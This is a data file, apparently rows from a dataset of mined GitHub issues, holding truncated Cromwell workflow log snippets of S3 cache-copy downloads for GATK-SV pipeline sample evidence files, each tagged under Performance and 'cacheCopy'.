focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-14/cacheCopy/SR00c.HG00557.txt.gz; 1608597138537,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-118/cacheCopy/SR00c.NA18941.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:54319,cache,cacheCopy,54319,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-25/cacheCopy/SR00c.HG01344.txt.gz; 1608597426322,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-139/cacheCopy/SR00c.NA19818.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-139/cacheCopy/SR00c.NA19818.txt.gz.tbi; 1608597428681,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-100/cacheCopy/SR00c.HG04158.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-100/cacheCopy/SR00c.HG04158.txt.gz; 1608597430528,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-30/cacheCopy/SR00c.HG01474.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:133495,cache,cacheCopy,133495,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-29/cacheCopy/SR00c.HG01396.txt.gz; 1608597256940,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-114/cacheCopy/SR00c.NA18553.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-114/cacheCopy/SR00c.NA18553.txt.gz.tbi; 1608597259619,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-59/cacheCopy/SR00c.HG02374.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-59/cacheCopy/SR00c.HG02374.txt.gz.tbi; 1608597261055,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-145/cacheCopy/SR00c.NA20509.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:87334,cache,cacheCopy,87334,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-32/cacheCopy/SR00c.HG01572.txt.gz; 1608597087902,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-104/cacheCopy/SR00c.NA10847.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-104/cacheCopy/SR00c.NA10847.txt.gz.tbi; 1608597089027,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-16/cacheCopy/SR00c.HG00625.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-16/cacheCopy/SR00c.HG00625.txt.gz.tbi; 1608597091077,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-122/cacheCopy/SR00c.NA19001.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:41224,cache,cacheCopy,41224,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-40/cacheCopy/SR00c.HG01874.txt.gz; 1608596981096,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-105/cacheCopy/SR00c.NA11894.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-105/cacheCopy/SR00c.NA11894.txt.gz.tbi; 1608596983896,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-69/cacheCopy/SR00c.HG02658.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-69/cacheCopy/SR00c.HG02658.txt.gz; 1608596985970,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-28/cacheCopy/SR00c.HG01393.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf01",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:12544,cache,cacheCopy,12544,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-43/cacheCopy/SR00c.HG01958.txt.gz.tbi; 1608597544559,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-9/cacheCopy/SR00c.HG00337.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-9/cacheCopy/SR00c.HG00337.txt.gz.tbi; 1608597545740,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-107/cacheCopy/SR00c.NA12489.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-107/cacheCopy/SR00c.NA12489.txt.gz.tbi; 1608597548876,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-135/cacheCopy/SR00c.NA19679.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:169285,cache,cacheCopy,169285,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-43/cacheCopy/SR00c.HG01958.txt.gz; 1608597529228,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-112/cacheCopy/SR00c.NA18539.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-112/cacheCopy/SR00c.NA18539.txt.gz.tbi; 1608597531104,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-21/cacheCopy/SR00c.HG01085.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-21/cacheCopy/SR00c.HG01085.txt.gz.tbi; 1608597532744,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-125/cacheCopy/SR00c.NA19102.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:164262,cache,cacheCopy,164262,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-44/cacheCopy/SR00c.HG01982.txt.gz; 1608597127083,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-126/cacheCopy/SR00c.NA19143.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-126/cacheCopy/SR00c.NA19143.txt.gz.tbi; 1608597129434,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-18/cacheCopy/SR00c.HG00740.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-18/cacheCopy/SR00c.HG00740.txt.gz; 1608597132184,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-22/cacheCopy/SR00c.HG01112.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:52452,cache,cacheCopy,52452,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-50/cacheCopy/SR00c.HG02085.txt.gz.tbi; 1608597606470,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-6/cacheCopy/SR00c.HG00239.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-6/cacheCopy/SR00c.HG00239.txt.gz.tbi; 1608597610071,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-45/cacheCopy/SR00c.HG02002.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-45/cacheCopy/SR00c.HG02002.txt.gz; 1608597612565,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-0/cacheCopy/SR00c.NA12878.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:185464,cache,cacheCopy,185464,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-50/cacheCopy/SR00c.HG02085.txt.gz; 1608597218252,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-146/cacheCopy/SR00c.NA20510.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-146/cacheCopy/SR00c.NA20510.txt.gz.tbi; 1608597219467,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-124/cacheCopy/SR00c.NA19062.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-124/cacheCopy/SR00c.NA19062.txt.gz.tbi; 1608597222742,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-86/cacheCopy/SR00c.HG03649.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:77369,cache,cacheCopy,77369,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-55/cacheCopy/SR00c.HG02275.txt.gz; 1608597196671,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-108/cacheCopy/SR00c.NA12872.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-108/cacheCopy/SR00c.NA12872.txt.gz.tbi; 1608597198607,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-83/cacheCopy/SR00c.HG03476.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-83/cacheCopy/SR00c.HG03476.txt.gz.tbi; 1608597201756,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-129/cacheCopy/SR00c.NA19351.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:71122,cache,cacheCopy,71122,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
